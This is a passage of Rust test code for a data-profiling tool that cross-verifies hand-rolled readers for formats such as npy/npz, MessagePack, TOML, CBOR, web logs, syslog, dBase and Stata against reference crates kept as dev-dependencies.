            "tests/fixtures/sample_matrix.npy",
            "tests/fixtures/sample_structured.npy",
            "tests/fixtures/type_detection.npy",
            "tests/fixtures/edge_npy_big_endian_and_subarray.npy",
        ] {
            let path = Path::new(f);
            let mine = npy_support::columns_from_npy(path, None, 100)
                .unwrap_or_else(|e| panic!("{f}: hand-rolled reader failed: {e:?}"));

            let file = std::fs::File::open(path).unwrap();
            let npy = npyz::NpyFile::new(std::io::BufReader::new(file)).unwrap();
            let theirs = columns_from_npy_via_npyz(npy, 100);

            assert_eq!(
                mine.iter().map(|c| &c.name).collect::<Vec<_>>(),
                theirs.iter().map(|c| &c.name).collect::<Vec<_>>(),
                "{f}: column names differ"
            );
            for (m, t) in mine.iter().zip(theirs.iter()) {
                assert_eq!(
                    m.current_type, t.current_type,
                    "{f} col '{}': current_type",
                    m.name
                );
                assert_eq!(
                    m.ideal_type, t.ideal_type,
                    "{f} col '{}': ideal_type",
                    m.name
                );
                assert_eq!(
                    m.sample_values, t.sample_values,
                    "{f} col '{}': sample_values",
                    m.name
                );
            }
        }
    }

    /// Same cross-verification, for `.npz` - exercises the ZIP/DEFLATE
    /// path (`zip_support::ZipArchive`) that standalone `.npy` files never
    /// touch, including a `savez_compressed`-produced archive whose
    /// entries are genuinely DEFLATE-compressed rather than stored.
    #[cfg(feature = "npy")]
    #[test]
    fn npz_reader_matches_the_npyz_crate_output_exactly() {
        for f in [
            "tests/fixtures/sample.npz",
            "tests/fixtures/type_detection.npz",
        ] {
            let path = Path::new(f);
            let mine = npy_support::columns_from_npz(path, None, 100)
                .unwrap_or_else(|e| panic!("{f}: hand-rolled reader failed: {e:?}"));

            let mut archive = npyz::npz::NpzArchive::open(path).unwrap();
            let names: Vec<String> = archive.array_names().map(str::to_string).collect();
            for name in names {
                let npy = archive.by_name(&name).unwrap().unwrap();
                let theirs = columns_from_npy_via_npyz(npy, 100);
                let (_, mine_cols) = mine.iter().find(|(n, _)| n == &name).unwrap();
                assert_eq!(
                    mine_cols.iter().map(|c| &c.name).collect::<Vec<_>>(),
                    theirs.iter().map(|c| &c.name).collect::<Vec<_>>(),
                    "{f} array '{name}': column names differ"
                );
                for (m, t) in mine_cols.iter().zip(theirs.iter()) {
                    assert_eq!(
                        m.sample_values, t.sample_values,
                        "{f} array '{name}' col '{}': sample_values",
                        m.name
                    );
                }
            }
        }
    }

    /// Test-only: `rmpv`/`rmp` are dev-dependencies now (see Cargo.toml
    /// and CLAUDE.md's Dependency footprint section) - `msgpack_support`'s
    /// own hand-rolled decoder replaced them at runtime, so this
    /// function's only remaining job is producing the "expected" side of
    /// `msgpack_reader_matches_the_rmpv_crate_output_exactly`. A near-
    /// verbatim copy of what `columns_from_msgpack` used to be before
    /// that module replaced it.
    #[cfg(all(test, feature = "msgpack"))]
    fn columns_from_msgpack_via_rmpv(path: &Path, n_samples: usize) -> Result<Vec<ColumnProfile>> {
        use std::io::BufRead;

        fn key_to_string(k: &rmpv::Value) -> String {
            if let rmpv::Value::String(s) = k
                && let Some(s) = s.as_str()
            {
                return s.to_string();
            }
            value_to_json(k).to_string()
        }
        fn value_to_json(v: &rmpv::Value) -> JsonValue {
            use rmpv::Value as MpValue;
            match v {
                MpValue::Nil => JsonValue::Null,
                MpValue::Boolean(b) => JsonValue::Bool(*b),
                MpValue::Integer(i) => i
                    .as_i64()
                    .map(JsonValue::from)
                    .or_else(|| i.as_u64().map(JsonValue::from))
                    .unwrap_or(JsonValue::Null),
                MpValue::F32(f) => serde_json::Number::from_f64(f64::from(*f))
                    .map_or(JsonValue::Null, JsonValue::Number),
                MpValue::F64(f) => {
                    serde_json::Number::from_f64(*f).map_or(JsonValue::Null, JsonValue::Number)
                }
                MpValue::String(s) => JsonValue::String(match s.as_str() {
                    Some(s) => s.to_string(),
                    None => s.as_bytes().iter().map(|b| format!("{b:02x}")).collect(),
                }),
                MpValue::Binary(b) => {
                    JsonValue::String(b.iter().map(|byte| format!("{byte:02x}")).collect())
                }
                MpValue::Array(items) => {
                    JsonValue::Array(items.iter().map(value_to_json).collect())
                }
                MpValue::Map(pairs) => JsonValue::Object(
                    pairs
                        .iter()
                        .map(|(k, v)| (key_to_string(k), value_to_json(v)))
                        .collect(),
                ),
                MpValue::Ext(kind, data) => {
                    JsonValue::String(format!("ext({kind}, {} bytes)", data.len()))
                }
            }
        }

        let file = std::fs::File::open(path)?;
        let mut reader = std::io::BufReader::new(file);
        let mut top_values = Vec::new();
        while !reader.fill_buf()?.is_empty() {
            top_values.push(rmpv::decode::read_value(&mut reader)?);
        }
        let values: Vec<rmpv::Value> = if top_values.len() == 1 {
            match top_values.into_iter().next().unwrap() {
                rmpv::Value::Array(items) => items,
                other => vec![other],
            }
        } else {
            top_values
        };
        let values: Vec<JsonValue> = values.iter().map(value_to_json).collect();

        if values.iter().all(JsonValue::is_object) {
            let records: Vec<serde_json::Map<String, JsonValue>> = values
                .into_iter()
                .map(|v| match v {
                    JsonValue::Object(m) => m,
                    _ => unreachable!(),
                })
                .collect();
            Ok(profile_json_records(&records, n_samples))
        } else {
            let total = values.len();
            let refs: Vec<&JsonValue> = values.iter().filter(|v| !v.is_null()).collect();
            Ok(profile_json_path(
                "value".to_string(),
                total,
                refs,
                n_samples,
            ))
        }
    }

    /// Cross-verification oracle for the hand-rolled MessagePack decoder
    /// (`msgpack_support` - see Cargo.toml) against the real `rmpv`
    /// crate, kept as a dev-only dependency for exactly this purpose.
    #[cfg(feature = "msgpack")]
    #[test]
    fn msgpack_reader_matches_the_rmpv_crate_output_exactly() {
        for f in [
            "tests/fixtures/sample.msgpack",
            "tests/fixtures/type_detection.msgpack",
            "tests/fixtures/edge_msgpack_scalar_array.msgpack",
            "tests/fixtures/malformed_garbage.msgpack",
            "tests/fixtures/edge_msgpack_wide_markers.msgpack",
        ] {
            let path = Path::new(f);
            let mine = msgpack_support::columns_from_msgpack(path, None, 100)
                .unwrap_or_else(|e| panic!("{f}: hand-rolled reader failed: {e:?}"));
            let theirs = columns_from_msgpack_via_rmpv(path, 100)
                .unwrap_or_else(|e| panic!("{f}: rmpv-based oracle failed: {e:?}"));

            assert_eq!(
                mine.iter().map(|c| &c.name).collect::<Vec<_>>(),
                theirs.iter().map(|c| &c.name).collect::<Vec<_>>(),
                "{f}: column names differ"
            );
            for (m, t) in mine.iter().zip(theirs.iter()) {
                assert_eq!(
                    m.current_type, t.current_type,
                    "{f} col '{}': current_type",
                    m.name
                );
                assert_eq!(
                    m.ideal_type, t.ideal_type,
                    "{f} col '{}': ideal_type",
                    m.name
                );
                assert_eq!(
                    m.sample_values, t.sample_values,
                    "{f} col '{}': sample_values",
                    m.name
                );
            }
        }
    }

    /// Test-only: `toml` is a dev-dependency now (see Cargo.toml and
    /// CLAUDE.md's Dependency footprint section) - `toml_support`'s own
    /// hand-rolled parser replaced it at runtime, so this function's only
    /// remaining job is producing the "expected" side of
    /// `toml_reader_matches_the_toml_crate_output_exactly`. A near-
    /// verbatim copy of what `columns_from_toml` used to be before that
    /// module replaced it.
    #[cfg(all(test, feature = "toml"))]
    fn columns_from_toml_via_toml_crate(
        path: &Path,
        n_samples: usize,
    ) -> Result<Vec<ColumnProfile>> {
        fn value_to_json(v: &toml::Value) -> JsonValue {
            match v {
                toml::Value::String(s) => JsonValue::String(s.clone()),
                toml::Value::Integer(i) => JsonValue::from(*i),
                toml::Value::Float(f) => {
                    serde_json::Number::from_f64(*f).map_or(JsonValue::Null, JsonValue::Number)
                }
                toml::Value::Boolean(b) => JsonValue::Bool(*b),
                toml::Value::Datetime(dt) => JsonValue::String(dt.to_string()),
                toml::Value::Array(items) => {
                    JsonValue::Array(items.iter().map(value_to_json).collect())
                }
                toml::Value::Table(t) => JsonValue::Object(
                    t.iter()
                        .map(|(k, v)| (k.clone(), value_to_json(v)))
                        .collect(),
                ),
            }
        }
        let content = fs::read_to_string(path)?;
        let value: toml::Value = toml::from_str(&content)?;
        let record = match value_to_json(&value) {
            JsonValue::Object(m) => m,
            _ => bail!("expected a TOML document with top-level key-value pairs in {path:?}"),
        };
        Ok(profile_json_records(&[record], n_samples))
    }

    /// Cross-verification oracle for the hand-rolled TOML parser
    /// (`toml_support` - see Cargo.toml) against the real `toml` crate,
    /// kept as a dev-only dependency for exactly this purpose.
    #[cfg(feature = "toml")]
    #[test]
    fn toml_reader_matches_the_toml_crate_output_exactly() {
        for f in [
            "tests/fixtures/sample.toml",
            "tests/fixtures/type_detection.toml",
            "tests/fixtures/edge_toml_v1_1_features.toml",
        ] {
            let path = Path::new(f);
            if !path.exists() {
                continue;
            }
            let mine = toml_support::columns_from_toml(path, 100)
                .unwrap_or_else(|e| panic!("{f}: hand-rolled reader failed: {e:?}"));
            let theirs = columns_from_toml_via_toml_crate(path, 100)
                .unwrap_or_else(|e| panic!("{f}: toml-crate-based oracle failed: {e:?}"));

            assert_eq!(
                mine.iter().map(|c| &c.name).collect::<Vec<_>>(),
                theirs.iter().map(|c| &c.name).collect::<Vec<_>>(),
                "{f}: column names differ"
            );
            for (m, t) in mine.iter().zip(theirs.iter()) {
                assert_eq!(
                    m.current_type, t.current_type,
                    "{f} col '{}': current_type",
                    m.name
                );
                assert_eq!(
                    m.ideal_type, t.ideal_type,
                    "{f} col '{}': ideal_type",
                    m.name
                );
                assert_eq!(
                    m.sample_values, t.sample_values,
                    "{f} col '{}': sample_values",
                    m.name
                );
            }
        }
    }

    /// Test-only: `ciborium` is a dev-dependency now (see Cargo.toml and
    /// CLAUDE.md's Dependency footprint section) - `cbor_support`'s own
    /// hand-rolled decoder replaced it at runtime, so this function's only
    /// remaining job is producing the "expected" side of
    /// `cbor_reader_matches_the_ciborium_crate_output_exactly`. A near-
    /// verbatim copy of what `columns_from_cbor` used to be before that
    /// module replaced it.
    #[cfg(all(test, feature = "cbor"))]
    fn columns_from_cbor_via_ciborium(path: &Path, n_samples: usize) -> Result<Vec<ColumnProfile>> {
        use std::io::BufRead;

        fn key_to_string(k: &ciborium::Value) -> String {
            if let ciborium::Value::Text(s) = k {
                return s.clone();
            }
            match value_to_json(k) {
                JsonValue::String(s) => s,
                other => other.to_string(),
            }
        }
        fn value_to_json(v: &ciborium::Value) -> JsonValue {
            use ciborium::Value as CborValue;
            match v {
                CborValue::Null => JsonValue::Null,
                CborValue::Bool(b) => JsonValue::Bool(*b),
                CborValue::Integer(i) => i64::try_from(*i)
                    .map(JsonValue::from)
                    .unwrap_or_else(|_| JsonValue::String(i128::from(*i).to_string())),
                CborValue::Float(f) => {
                    serde_json::Number::from_f64(*f).map_or(JsonValue::Null, JsonValue::Number)
                }
                CborValue::Text(s) => JsonValue::String(s.clone()),
                CborValue::Bytes(b) => {
                    JsonValue::String(b.iter().map(|byte| format!("{byte:02x}")).collect())
                }
                CborValue::Array(items) => {
                    JsonValue::Array(items.iter().map(value_to_json).collect())
                }
                CborValue::Map(pairs) => JsonValue::Object(
                    pairs
                        .iter()
                        .map(|(k, v)| (key_to_string(k), value_to_json(v)))
                        .collect(),
                ),
                CborValue::Tag(tag, inner) => {
                    let mut obj = serde_json::Map::new();
                    obj.insert(format!("tag({tag})"), value_to_json(inner));
                    JsonValue::Object(obj)
                }
                _ => JsonValue::Null, // ciborium::Value is #[non_exhaustive]
            }
        }

        let file = std::fs::File::open(path)?;
        let mut reader = std::io::BufReader::new(file);
        let mut top_values: Vec<ciborium::Value> = Vec::new();
        while !reader.fill_buf()?.is_empty() {
            let v: ciborium::Value =
                ciborium::from_reader(&mut reader).map_err(|e| anyhow!("{e}"))?;
            top_values.push(v);
        }
        let values: Vec<ciborium::Value> = if top_values.len() == 1 {
            match top_values.into_iter().next().unwrap() {
                ciborium::Value::Array(items) => items,
                other => vec![other],
            }
        } else {
            top_values
        };
        let values: Vec<JsonValue> = values.iter().map(value_to_json).collect();

        if values.iter().all(JsonValue::is_object) {
            let records: Vec<serde_json::Map<String, JsonValue>> = values
                .into_iter()
                .map(|v| match v {
                    JsonValue::Object(m) => m,
                    _ => unreachable!(),
                })
                .collect();
            Ok(profile_json_records(&records, n_samples))
        } else {
            let total = values.len();
            let refs: Vec<&JsonValue> = values.iter().filter(|v| !v.is_null()).collect();
            Ok(profile_json_path(
                "value".to_string(),
                total,
                refs,
                n_samples,
            ))
        }
    }

    /// Cross-verification oracle for the hand-rolled CBOR decoder
    /// (`cbor_support` - see Cargo.toml) against the real `ciborium` crate,
    /// kept as a dev-only dependency for exactly this purpose.
    #[cfg(feature = "cbor")]
    #[test]
    fn cbor_reader_matches_the_ciborium_crate_output_exactly() {
        for f in [
            "tests/fixtures/sample.cbor",
            "tests/fixtures/type_detection.cbor",
            "tests/fixtures/edge_cbor_scalar_array.cbor",
        ] {
            let path = Path::new(f);
            if !path.exists() {
                continue;
            }
            let mine = cbor_support::columns_from_cbor(path, None, 100)
                .unwrap_or_else(|e| panic!("{f}: hand-rolled reader failed: {e:?}"));
            let theirs = columns_from_cbor_via_ciborium(path, 100)
                .unwrap_or_else(|e| panic!("{f}: ciborium-based oracle failed: {e:?}"));

            assert_eq!(
                mine.iter().map(|c| &c.name).collect::<Vec<_>>(),
                theirs.iter().map(|c| &c.name).collect::<Vec<_>>(),
                "{f}: column names differ"
            );
            for (m, t) in mine.iter().zip(theirs.iter()) {
                assert_eq!(
                    m.current_type, t.current_type,
                    "{f} col '{}': current_type",
                    m.name
                );
                assert_eq!(
                    m.ideal_type, t.ideal_type,
                    "{f} col '{}': ideal_type",
                    m.name
                );
                assert_eq!(
                    m.sample_values, t.sample_values,
                    "{f} col '{}': sample_values",
                    m.name
                );
            }
        }
    }

    /// Test-only: `regex` is a dev-dependency now (see Cargo.toml and
    /// CLAUDE.md's Dependency footprint section) - `weblog_support`'s own
    /// hand-rolled parser replaced it at runtime, so this function's only
    /// remaining job is producing the "expected" side of
    /// `weblog_reader_matches_the_regex_crate_output_exactly`. A near-
    /// verbatim copy of what `columns_from_weblog` used to be before that
    /// module replaced it.
    #[cfg(all(test, feature = "weblog"))]
    fn columns_from_weblog_via_regex(
        path: &Path,
        combined: bool,
    ) -> Result<Vec<(String, String, Vec<String>)>> {
        let pattern = if combined {
            r#"^(\S+) (\S+) (\S+) \[([^\]]+)\] "([^"]*)" (\d{3}|-) (\d+|-) "([^"]*)" "([^"]*)"$"#
        } else {
            r#"^(\S+) (\S+) (\S+) \[([^\]]+)\] "([^"]*)" (\d{3}|-) (\d+|-)$"#
        };
        let re = regex::Regex::new(pattern)?;
        let request_re = regex::Regex::new(r"^(\S+) (\S+) (\S+)$")?;
        let dash_to_none =
            |s: &str| -> Option<String> { if s == "-" { None } else { Some(s.to_string()) } };

        let mut names: Vec<&str> = vec![
            "host",
            "ident",
            "authuser",
            "timestamp",
            "method",
            "path",
            "protocol",
            "status",
            "bytes",
        ];
        if combined {
            names.extend(["referer", "user_agent"]);
        }

        let content = fs::read_to_string(path)?;
        let mut raw: Vec<Vec<Option<String>>> = vec![Vec::new(); names.len()];
        for line in content.lines() {
            if line.trim().is_empty() {
                continue;
            }
            let caps = re
                .captures(line)
                .ok_or_else(|| anyhow!("line doesn't match: {line:?}"))?;
            let (method, req_path, protocol) = match request_re.captures(&caps[5]) {
                Some(c) => (
                    Some(c[1].to_string()),
                    Some(c[2].to_string()),
                    Some(c[3].to_string()),
                ),
                None => (None, None, None),
            };
            let mut values = vec![
                dash_to_none(&caps[1]),
                dash_to_none(&caps[2]),
                dash_to_none(&caps[3]),
                Some(caps[4].to_string()),
                method,
                req_path,
                protocol,
                dash_to_none(&caps[6]),
                dash_to_none(&caps[7]),
            ];
            if combined {
                values.push(dash_to_none(&caps[8]));
                values.push(dash_to_none(&caps[9]));
            }
            for (col_idx, value) in values.into_iter().enumerate() {
                raw[col_idx].push(value);
            }
        }

        Ok(names
            .into_iter()
            .enumerate()
            .map(|(col_idx, name)| {
                let non_null: Vec<String> = raw[col_idx].iter().filter_map(|v| v.clone()).collect();
                let current_type = if non_null.is_empty() {
                    "String".to_string()
                } else {
                    let refs: Vec<&str> = non_null.iter().map(|s| s.as_str()).collect();
                    naive_current_type(&refs).to_string()
                };
                (name.to_string(), current_type, non_null)
            })
            .collect())
    }

    /// Cross-verification oracle for the hand-rolled Common/Combined Log
    /// Format parser (`weblog_support` - see Cargo.toml) against the real
    /// `regex` crate, kept as a dev-only dependency for exactly this
    /// purpose. Compares column names, `current_type` (run through the
    /// same `naive_current_type` both sides use), and every raw value -
    /// `ColumnProfile`'s own `ideal_type` isn't compared here since that
    /// would just be re-testing `suggest_ideal_type` itself, already
    /// covered exhaustively elsewhere; what this test actually needs to
    /// prove is that the two *parsers* extract identical field values.
    #[cfg(feature = "weblog")]
    #[test]
    fn weblog_reader_matches_the_regex_crate_output_exactly() {
        for (f, combined) in [
            ("tests/fixtures/sample_common.log", false),
            ("tests/fixtures/sample_combined.log", true),
        ] {
            let path = Path::new(f);
            let mine = weblog_support::columns_from_weblog(path, None, combined)
                .unwrap_or_else(|e| panic!("{f}: hand-rolled reader failed: {e:?}"));
            let theirs = columns_from_weblog_via_regex(path, combined)
                .unwrap_or_else(|e| panic!("{f}: regex-based oracle failed: {e:?}"));

            assert_eq!(
                mine.iter().map(|c| c.name.clone()).collect::<Vec<_>>(),
                theirs.iter().map(|c| c.0.clone()).collect::<Vec<_>>(),
                "{f}: column names differ"
            );
            for (m, (name, current_type, values)) in mine.iter().zip(theirs.iter()) {
                assert_eq!(
                    &m.current_type, current_type,
                    "{f} col '{name}': current_type"
                );
                assert_eq!(&m.raw_values, values, "{f} col '{name}': raw values");
            }
        }
    }

    /// Test-only: near-verbatim copy of what `columns_from_syslog` used to
    /// be before `syslog_support` replaced it - see the weblog oracle's
    /// own doc comment above for why this exists.
    #[cfg(all(test, feature = "syslog"))]
    fn columns_from_syslog_via_regex(
        path: &Path,
        rfc5424: bool,
    ) -> Result<Vec<(String, String, Vec<String>)>> {
        let pattern = if rfc5424 {
            r#"^<(\d{1,3})>(\d+) (\S+) (\S+) (\S+) (\S+) (\S+) (-|\[[^\]]*\]) ?(.*)$"#
        } else {
            r"^(?:<(\d{1,3})>)?([A-Za-z]{3}\s+\d{1,2}\s\d{2}:\d{2}:\d{2}) (\S+) ([^:\[]+?)(?:\[(\d+)\])?: ?(.*)$"
        };
        let re = regex::Regex::new(pattern)?;
        let dash_to_none =
            |s: &str| -> Option<String> { if s == "-" { None } else { Some(s.to_string()) } };

        let names: Vec<&str> = if rfc5424 {
            vec![
                "facility",
                "severity",
                "version",
                "timestamp",
                "hostname",
                "app_name",
                "procid",
                "msgid",
                "structured_data",
                "message",
            ]
        } else {
            vec![
                "facility",
                "severity",
                "timestamp",
                "hostname",
                "tag",
                "pid",
                "message",
            ]
        };

        let content = fs::read_to_string(path)?;
        let mut raw: Vec<Vec<Option<String>>> = vec![Vec::new(); names.len()];
        for line in content.lines() {
            if line.trim().is_empty() {
                continue;
            }
            let caps = re
                .captures(line)
                .ok_or_else(|| anyhow!("line doesn't match: {line:?}"))?;
            let pri: Option<u32> = caps.get(1).map(|m| m.as_str().parse::<u32>()).transpose()?;
            let values: Vec<Option<String>> = if rfc5424 {
                let pri = pri.expect("RFC 5424's regex always captures PRI");
                vec![
                    Some(syslog_facility_name(pri)),
                    Some(syslog_severity_name(pri)),
                    Some(caps[2].to_string()),
                    Some(caps[3].to_string()),
                    dash_to_none(&caps[4]),
                    dash_to_none(&caps[5]),
                    dash_to_none(&caps[6]),
                    dash_to_none(&caps[7]),
                    dash_to_none(&caps[8]),
                    Some(caps[9].to_string()),
                ]
            } else {
                vec![
                    pri.map(syslog_facility_name),
                    pri.map(syslog_severity_name),
                    Some(caps[2].to_string()),
                    Some(caps[3].to_string()),
                    Some(caps[4].to_string()),
                    caps.get(5).map(|m| m.as_str().to_string()),
                    Some(caps[6].to_string()),
                ]
            };
            for (col_idx, value) in values.into_iter().enumerate() {
                raw[col_idx].push(value);
            }
        }

        Ok(names
            .into_iter()
            .enumerate()
            .map(|(col_idx, name)| {
                let non_null: Vec<String> = raw[col_idx].iter().filter_map(|v| v.clone()).collect();
                let current_type = if non_null.is_empty() {
                    "String".to_string()
                } else {
                    let refs: Vec<&str> = non_null.iter().map(|s| s.as_str()).collect();
                    naive_current_type(&refs).to_string()
                };
                (name.to_string(), current_type, non_null)
            })
            .collect())
    }

    /// Cross-verification oracle for the hand-rolled syslog parser
    /// (`syslog_support` - see Cargo.toml) against the real `regex` crate,
    /// kept as a dev-only dependency for exactly this purpose.
    #[cfg(feature = "syslog")]
    #[test]
    fn syslog_reader_matches_the_regex_crate_output_exactly() {
        for (f, rfc5424) in [
            ("tests/fixtures/sample_rfc3164.log", false),
            ("tests/fixtures/sample_rfc3164_no_pri.log", false),
            ("tests/fixtures/sample_rfc5424.log", true),
            ("tests/fixtures/edge_rfc5424_uniform_timestamps.log", true),
        ] {
            let path = Path::new(f);
            let mine = syslog_support::columns_from_syslog(path, None, rfc5424)
                .unwrap_or_else(|e| panic!("{f}: hand-rolled reader failed: {e:?}"));
            let theirs = columns_from_syslog_via_regex(path, rfc5424)
                .unwrap_or_else(|e| panic!("{f}: regex-based oracle failed: {e:?}"));

            assert_eq!(
                mine.iter().map(|c| c.name.clone()).collect::<Vec<_>>(),
                theirs.iter().map(|c| c.0.clone()).collect::<Vec<_>>(),
                "{f}: column names differ"
            );
            for (m, (name, current_type, values)) in mine.iter().zip(theirs.iter()) {
                assert_eq!(
                    &m.current_type, current_type,
                    "{f} col '{name}': current_type"
                );
                assert_eq!(&m.raw_values, values, "{f} col '{name}': raw values");
            }
        }
    }

    /// Test-only: `dbase` is a dev-dependency now (see Cargo.toml and
    /// CLAUDE.md's Dependency footprint section) - `dbase_support`'s own
    /// hand-rolled reader replaced it at runtime, so this function's only
    /// remaining job is producing the "expected" side of
    /// `dbase_reader_matches_the_dbase_crate_output_exactly`. A near-
    /// verbatim copy of what `columns_from_dbase` used to be before that
    /// module replaced it.
    #[cfg(all(test, feature = "dbase"))]
    fn dbase_field_type_label_via_dbase_crate(t: dbase::FieldType) -> &'static str {
        match t {
            dbase::FieldType::Character | dbase::FieldType::Memo => "String",
            dbase::FieldType::Numeric
            | dbase::FieldType::Float
            | dbase::FieldType::Double
            | dbase::FieldType::Currency => "f64",
            dbase::FieldType::Integer => "i64",
            dbase::FieldType::Logical => "bool",
            dbase::FieldType::Date => "Date",
            dbase::FieldType::DateTime => "Timestamp",
        }
    }

    #[cfg(all(test, feature = "dbase"))]
    fn dbase_value_to_string_via_dbase_crate(v: &dbase::FieldValue) -> Option<String> {
        use dbase::FieldValue;
        match v {
            FieldValue::Character(s) => s.clone(),
            FieldValue::Numeric(n) => n.map(|x| x.to_string()),
            FieldValue::Logical(b) => b.map(|x| x.to_string()),
            FieldValue::Date(d) => d.map(|x| x.to_string()),
            FieldValue::Float(f) => f.map(|x| x.to_string()),
            FieldValue::Integer(i) => Some(i.to_string()),
            FieldValue::Currency(c) => Some(c.to_string()),
            FieldValue::DateTime(dt) => Some(format!(
                "{} {:02}:{:02}:{:02}",
                dt.date(),
                dt.time().hours(),
                dt.time().minutes(),
                dt.time().seconds()
            )),
            FieldValue::Double(d) => Some(d.to_string()),
            FieldValue::Memo(s) => Some(s.clone()),
        }
    }

    #[cfg(all(test, feature = "dbase"))]
    fn columns_from_dbase_via_dbase_crate(
        path: &Path,
        n_samples: usize,
    ) -> Result<Vec<ColumnProfile>> {
        let mut reader = dbase::Reader::from_path(path)?;
        let fields: Vec<(String, &'static str)> = reader
            .fields()
            .iter()
            .map(|f| {
                (
                    f.name().to_string(),
                    dbase_field_type_label_via_dbase_crate(f.field_type()),
                )
            })
            .collect();

        let records = reader.read()?;
        let total = records.len();

        let mut columns = Vec::new();
        for (name, current_type) in fields {
            let raw_values: Vec<String> = records
                .iter()
                .filter_map(|r| r.get(&name).and_then(dbase_value_to_string_via_dbase_crate))
                .collect();
            columns.push(profile_column(
                ColumnInput {
                    name,
                    current_type: current_type.to_string(),
                    raw_values,
                    total,
                    skip_heuristics: false,
                },
                n_samples,
            ));
        }
        Ok(columns)
    }

    /// Cross-verification oracle for the hand-rolled dBase reader
    /// (`dbase_support` - see Cargo.toml) against the real `dbase` crate,
    /// kept as a dev-only dependency for exactly this purpose.
    #[cfg(feature = "dbase")]
    #[test]
    fn dbase_reader_matches_the_dbase_crate_output_exactly() {
        for f in [
            "tests/fixtures/sample.dbf",
            "tests/fixtures/type_detection.dbf",
        ] {
            let path = Path::new(f);
            let mine = dbase_support::columns_from_dbase(path, None, 100)
                .unwrap_or_else(|e| panic!("{f}: hand-rolled reader failed: {e:?}"));
            let theirs = columns_from_dbase_via_dbase_crate(path, 100)
                .unwrap_or_else(|e| panic!("{f}: dbase-crate-based oracle failed: {e:?}"));

            assert_eq!(
                mine.iter().map(|c| &c.name).collect::<Vec<_>>(),
                theirs.iter().map(|c| &c.name).collect::<Vec<_>>(),
                "{f}: column names differ"
            );
            for (m, t) in mine.iter().zip(theirs.iter()) {
                assert_eq!(
                    m.current_type, t.current_type,
                    "{f} col '{}': current_type",
                    m.name
                );
                assert_eq!(
                    m.ideal_type, t.ideal_type,
                    "{f} col '{}': ideal_type",
                    m.name
                );
                assert_eq!(
                    m.sample_values, t.sample_values,
                    "{f} col '{}': sample_values",
                    m.name
                );
            }
        }
    }

    /// Test-only: `dta` is a dev-dependency now (see Cargo.toml and
    /// CLAUDE.md's Dependency footprint section) - `stata_support`'s own
    /// hand-rolled reader replaced it at runtime, so this function's only
    /// remaining job is producing the "expected" side of
    /// `stata_reader_matches_the_dta_crate_output_exactly`. A near-
    /// verbatim copy of what `columns_from_stata` used to be before that
    /// module replaced it.
    #[cfg(all(test, feature = "stata"))]
    fn stata_value_to_string_via_dta_crate(v: &dta::stata::dta::value::Value) -> Option<String> {
        use dta::stata::dta::value::Value;
        use dta::stata::stata_byte::StataByte;
        use dta::stata::stata_double::StataDouble;
        use dta::stata::stata_float::StataFloat;
        use dta::stata::stata_int::StataInt;
        use dta::stata::stata_long::StataLong;
        match v {
            Value::Byte(StataByte::Present(x)) => Some(x.to_string()),
            Value::Byte(StataByte::Missing(_)) => None,
            Value::Int(StataInt::Present(x)) => Some(x.to_string()),
            Value::Int(StataInt::Missing(_)) => None,
            Value::Long(StataLong::Present(x)) => Some(x.to_string()),
            Value::Long(StataLong::Missing(_)) => None,
            Value::Float(StataFloat::Present(x)) => Some(x.to_string()),
            Value::Float(StataFloat::Missing(_)) => None,
            Value::Double(StataDouble::Present(x)) => Some(x.to_string()),
            Value::Double(StataDouble::Missing(_)) => None,
            Value::String(s) => {
                let s = s.trim();
                if s.is_empty() {
                    None
                } else {
                    Some(s.to_string())
                }
            }
            Value::LongStringRef(_) => Some("<strL: long string not resolved>".to_string()),
        }
    }

    #[cfg(all(test, feature = "stata"))]
    fn stata_type_label_via_dta_crate(
        t: dta::stata::dta::variable_type::VariableType,
    ) -> &'static str {
        use dta::stata::dta::variable_type::VariableType;
        match t {
            VariableType::Byte | VariableType::Int | VariableType::Long => "i64",
            VariableType::Float | VariableType::Double => "f64",
            VariableType::FixedString(_) | VariableType::LongString => "String",
        }
    }

    #[cfg(all(test, feature = "stata"))]
    fn columns_from_stata_via_dta_crate(
        path: &Path,
        n_samples: usize,
    ) -> Result<Vec<ColumnProfile>> {
        use dta::stata::dta::dta_reader::DtaReader;

        let mut characteristic_reader = DtaReader::new()
            .from_path(path)?
            .read_header()?
            .read_schema()?;
        characteristic_reader.skip_to_end()?;

        let mut record_reader = characteristic_reader.into_record_reader()?;
        let variables: Vec<(String, &'static str)> = record_reader
            .schema()
            .variables()
            .iter()
            .map(|v| {
                (
                    v.name().to_string(),
                    stata_type_label_via_dta_crate(v.variable_type()),
                )
            })
            .collect();

        let mut raw: Vec<Vec<Option<String>>> = vec![Vec::new(); variables.len()];
        let mut total = 0usize;
        while let Some(record) = record_reader.read_record()? {
            for (col_idx, value) in record.values().iter().enumerate() {
                raw[col_idx].push(stata_value_to_string_via_dta_crate(value));
            }
            total += 1;
        }

        let mut columns = Vec::new();
        for ((name, current_type), values) in variables.into_iter().zip(raw) {
            let non_null: Vec<String> = values.into_iter().flatten().collect();
            columns.push(profile_column(
                ColumnInput {
                    name,
                    current_type: current_type.to_string(),
                    raw_values: non_null,
                    total,
                    skip_heuristics: false,
                },
                n_samples,
            ));
        }
        Ok(columns)
    }

    /// Cross-verification oracle for the hand-rolled Stata reader
    /// (`stata_support` - see Cargo.toml) against the real `dta` crate,
    /// kept as a dev-only dependency for exactly this purpose.
    #[cfg(feature = "stata")]
    #[test]
    fn stata_reader_matches_the_dta_crate_output_exactly() {
        for f in [
            "tests/fixtures/sample.dta",
            "tests/fixtures/type_detection.dta",
        ] {
            let path = Path::new(f);
            let mine = stata_support::columns_from_stata(path, None, 100)
                .unwrap_or_else(|e| panic!("{f}: hand-rolled reader failed: {e:?}"));
            let theirs = columns_from_stata_via_dta_crate(path, 100)
                .unwrap_or_else(|e| panic!("{f}: dta-crate-based oracle failed: {e:?}"));

            assert_eq!(
                mine.iter().map(|c| &c.name).collect::<Vec<_>>(),
                theirs.iter().map(|c| &c.name).collect::<Vec<_>>(),
                "{f}: column names differ"
            );
            for (m, t) in mine.iter().zip(theirs.iter()) {
                assert_eq!(
                    m.current_type, t.current_type,
                    "{f} col '{}': current_type",
                    m.name
                );
                assert_eq!(
                    m.ideal_type, t.ideal_type,
                    "{f} col '{}': ideal_type",
                    m.name
                );
                assert_eq!(
                    m.sample_values, t.sample_values,
                    "{f} col '{}': sample_values",
                    m.name
                );
            }
        }
    }

    /// Test-only: `apache-avro` (plus `num-bigint`) is a dev-dependency now
    /// (see Cargo.toml and CLAUDE.md's Dependency footprint section) -
    /// `avro_support`'s own hand-rolled reader replaced it at runtime, so
